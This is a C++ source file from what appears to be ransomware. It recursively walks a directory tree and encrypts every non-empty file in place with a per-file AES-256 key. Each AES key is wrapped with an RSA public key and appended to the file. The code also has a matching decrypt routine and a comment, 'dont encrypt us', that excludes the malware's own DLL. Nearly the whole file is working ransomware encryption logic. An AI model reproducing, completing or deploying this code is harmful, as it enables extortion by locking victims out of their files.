#include "FileManager.h"
#include "External/base64.h"

#include <filesystem>
#include <iostream>
#include <iomanip>

bool File::FilePathExists() {
    return std::filesystem::exists(Serialization::BytestringToString(this->m_Metadata.path));
}

File::File(std::string & path)
{
    this->m_Metadata.path = Serialization::SerializeString(path);

    if ( !FilePathExists() )
        return;

    this->m_Metadata.size = std::filesystem::file_size(path);
    this->m_Metadata.name = Serialization::SerializeString(std::filesystem::path(path).filename().string());
    this->m_Metadata.extension = Serialization::SerializeString(std::filesystem::path(path).extension().string());
}

std::string File::ReadFrom() {
    std::string output = "";

    if ( !FilePathExists() )
        return output;

    std::ifstream file(Serialization::BytestringToString(this->m_Metadata.path), std::ifstream::binary);
    
    std::stringstream contents;
    contents << file.rdbuf();
    output = contents.str();
    file.close();

    this->m_Metadata.contents = Serialization::SerializeString(output);

    return output;
}

bool File::WriteTo(std::string& data) {
    if ( !FilePathExists() )
        return false;

    std::ofstream file(Serialization::BytestringToString(this->m_Metadata.path), std::ofstream::binary | std::ofstream::trunc);
    file.write(data.c_str(), data.size());
    file.flush();

    this->m_Metadata.contents = Serialization::SerializeString(data);

    return true;
}

void FileManager::FindFiles(const std::string& startDirectory) {
    if ( !std::filesystem::exists(startDirectory) )
        return;

    for ( auto& dir : std::filesystem::recursive_directory_iterator(startDirectory) ) {
        std::string path = dir.path().string();
        File file(path);
        this->m_FileList.push_back(file);
    }
}

void FileManager::OutputFoundFiles() {
    for ( File& file : this->m_FileList )
        std::cout << Serialization::BytestringToString(file.m_Metadata.name) << " : Size " << file.m_Metadata.size << " bytes." << std::endl;
}

void FileManager::TransformFiles(const std::string& startPath, void (FileManager::*procedure)(File&), FileManager& context ) {
    if ( !std::filesystem::exists(startPath) )
        return;

    for ( auto& dir : std::filesystem::recursive_directory_iterator(startPath) ) {
        if ( std::filesystem::is_directory(dir) || std::filesystem::file_size(dir) <= 0 )
            continue;

        if ( dir.path().filename() == "mlang.dll" ) // dont encrypt us
            continue;

        std::string filePath = dir.path().string();
        File file(filePath);
        ( context.*procedure )( file );
    }
}

void FileManager::EncryptContents(File& file) {
    BYTESTRING AESKey          = LGCrypto::Generate256AESKey();
    BYTESTRING AESIV           = LGCrypto::GenerateAESIV();
    BYTESTRING AESKeyEncrypted = LGCrypto::RSAEncrypt(AESKey, this->m_EncryptionKeys.pub, FALSE);
    BYTESTRING plainText       = Serialization::SerializeString(file.ReadFrom());
    
    BYTESTRING encrypted       = LGCrypto::AESEncrypt(plainText, AESKey, AESIV);
    encrypted.insert(encrypted.end(), AESKeyEncrypted.begin(), AESKeyEncrypted.end());
    encrypted.insert(encrypted.end(), AESIV.begin(), AESIV.end());

    std::string tmp = Serialization::BytestringToString(encrypted);
    file.WriteTo(tmp);
}

void FileManager::DecryptContents(File& file) {
    OutputDebugStringA(std::string("Decrypting " + Serialization::BytestringToString(file.m_Metadata.name)).c_str());

    if ( !this->m_EncryptionKeys.priv ) {
        OutputDebugStringA("bad private key :(");
    }

    BYTESTRING cipherText = Serialization::SerializeString(file.ReadFrom());
    OutputDebugStringA("got cipher text");

    BYTESTRING AESIV(cipherText.end() - 16, cipherText.end()); cipherText.erase(cipherText.end() - 16, cipherText.end());
    OutputDebugStringA("got aes iv");
    BYTESTRING AESKeyEncrypted(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end()); cipherText.erase(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end());
    BYTESTRING AESKey = LGCrypto::RSADecrypt(AESKeyEncrypted, this->m_EncryptionKeys.priv, TRUE);
    OutputDebugStringA("got aes key");
    BYTESTRING plaintext = LGCrypto::AESDecrypt(cipherText, AESKey, AESIV);
    std::string plaintextString = Serialization::BytestringToString(plaintext);
    OutputDebugStringA("decrypted content");

    file.WriteTo(plaintextString);
}

//const BYTESTRING FileManager::TransformFile(File& file) {
//    return {};
//}
